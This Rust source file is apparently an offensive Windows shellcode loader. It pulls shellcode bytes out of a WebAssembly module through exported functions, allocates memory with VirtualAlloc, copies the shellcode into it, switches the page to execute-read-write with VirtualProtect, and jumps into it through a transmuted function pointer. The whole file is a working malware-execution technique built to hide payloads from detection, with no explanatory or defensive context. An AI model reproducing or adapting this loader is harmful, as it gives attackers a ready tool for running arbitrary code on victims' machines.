use std::{fs, ptr::copy};
use wasmtime::{self, Engine, Error, Instance, Module, Store};
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, 
    PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};

fn main() -> Result<(), Error> {
    // Create a Wasmtime engine to execute WebAssembly
    let engine = Engine::default();
    let mut store = Store::new(&engine, ());
    
    // Load the WebAssembly binary file (expected to contain shellcode)
    let wasm_binary = fs::read("shell.wat")?;
    let module = Module::new(&engine, &wasm_binary)?;
    let instance = Instance::new(&mut store, &module, &[])?;
    
    // Retrieve WebAssembly functions that will provide the shellcode size and contents
    let get_wasm = instance.get_func(&mut store, "get_wasm_mem_size").expect("Not found get_wasm_mem_size");
    let read_asm = instance.get_func(&mut store, "read_wasm_at_index").expect("Not found read_wasm_at_index");
    
    let read_wasm_at_index = read_asm.typed::<u32, u32>(&store)?;
    let get_wasm_mem_size = get_wasm.typed::<(), u32>(&store)?;
    
    // Get the size of the shellcode stored in WebAssembly memory
    let size = get_wasm_mem_size.call(&mut store, ())?;
    let mut shellcode = vec![0; size as usize];

    // Read shellcode bytes from WebAssembly memory and store them in the Rust buffer
    for i in 0..size {
        let value = read_wasm_at_index.call(&mut store, i)?;
        shellcode[i as usize] = value as u8;
    }

    // Performing the execution
    unsafe {
        println!("[+] Memory Allocation Being Performed");
        let shellcode_addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        println!("[+] Copying a Shellcode To Target Memory");
        copy(
            shellcode.as_ptr().cast(),
            shellcode_addr,
            shellcode.len(),
        );

        println!("[+] Changing Page Permissions");
        let mut old_protection = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(
            shellcode_addr,
            shellcode.len(),
            PAGE_EXECUTE_READWRITE,
            &mut old_protection,
        )?;

        let func: fn() = std::mem::transmute(shellcode_addr);
        func()
    }

    Ok(())
}
